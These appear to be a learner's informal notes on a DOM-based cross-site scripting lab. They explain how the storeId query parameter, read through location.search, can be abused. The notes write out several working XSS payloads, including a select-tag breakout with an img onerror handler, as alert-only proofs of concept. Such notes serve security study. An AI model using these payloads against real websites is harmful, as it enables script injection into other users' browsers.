used:
product?productId=1&storeId="location.search.get(document.write(<script>alert(1)</script>))

which was correct however the website recommends using:
product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>

as this uses the select tag

the important part was being able to manipulate the URL to contain &storedid=

the "location.search" is typically vulnerable to DOM XSS attacks.

this looks the at the query string in the URL in thei case ?productId=2

and takes in the value of that

however us changing that to ?productId=1&storeId= allowed us to set the value for storeId

<img src='x' onerror=alert(1)>
